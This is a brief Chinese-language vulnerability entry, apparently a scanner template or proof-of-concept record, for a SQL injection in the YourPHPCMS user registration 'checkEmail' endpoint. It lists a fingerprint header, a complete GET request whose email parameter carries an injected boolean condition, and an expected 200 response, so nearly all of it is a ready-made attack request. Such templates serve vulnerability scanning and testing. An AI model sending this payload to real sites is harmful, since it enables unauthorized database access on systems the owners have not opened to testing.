# YourPHPCMS系统Register_checkEmail存在sql注入漏洞

YourPHPCMS ｜ SQL注入 ｜ —
- **指纹**：`header="YP_onlineid"`
- **请求**：`GET /index.php?g=User&m=Register&a=checkEmail&userid=1&email=-69710348@nwcrb.com'+or+'1'='2" HTTP/1.1`
- **响应特征**：200